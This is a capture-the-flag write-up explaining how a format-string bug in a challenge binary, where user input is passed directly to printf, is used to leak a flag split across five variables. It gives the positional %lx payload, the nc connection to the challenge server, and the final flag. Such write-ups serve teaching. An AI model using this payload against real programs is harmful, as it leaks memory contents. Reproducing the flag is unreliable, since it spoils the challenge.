# CHOP SHOP
# Pwn (Easy)
pwd
git status

APPROACH:

First, I checked the source code:

cat chop_shop.c

The important part of the code was:

    memcpy(&c1,flag,8);
    memcpy(&c2,flag+8,8);
    memcpy(&c3,flag+16,8);
    memcpy(&c4,flag+24,8);
    memcpy(&c5,flag+32,8);

    fgets(buf,sizeof(buf),stdin);
    printf(buf,c1,c2,c3,c4,c5);

The flag is split into five 8-byte pieces and stored in c1, c2, c3, c4 and c5.

The main vulnerability is the printf statement:

    printf(buf,c1,c2,c3,c4,c5);

Since buf is directly used as the printf format string, I can control the format string and use format specifiers to print the values passed to printf.

I first checked the binary:

file chop_shop

Then made it executable:

chmod +x chop_shop

The format string payload I used was:

%1$016lx%2$016lx%3$016lx%4$016lx%5$016lx

Here:

%1$016lx  - prints c1
%2$016lx  - prints c2
%3$016lx  - prints c3
%4$016lx  - prints c4
%5$016lx  - prints c5

Each value contains 8 bytes of the flag, so this leaks all five pieces.

Then I connected to the challenge server:

nc 3.111.53.245 1337

When it showed:

Lets Chop:

I entered:

%1$016lx%2$016lx%3$016lx%4$016lx%5$016lx

This gave the hexadecimal values of the five pieces of the flag.

The values were stored in little-endian order, so I reversed the bytes of each 8-byte chunk and joined them together.

This gave the final flag:

bi0s{ch0pp3d_1nt0_r3g1st3rs_n0t_st4ck}


COMMANDS USED:

cat chop_shop.c
file chop_shop
chmod +x chop_shop
./chop_shop
nc 3.111.53.245 1337

PAYLOAD:

%1$016lx%2$016lx%3$016lx%4$016lx%5$016lx

FINAL FLAG:

bi0s{ch0pp3d_1nt0_r3g1st3rs_n0t_st4ck}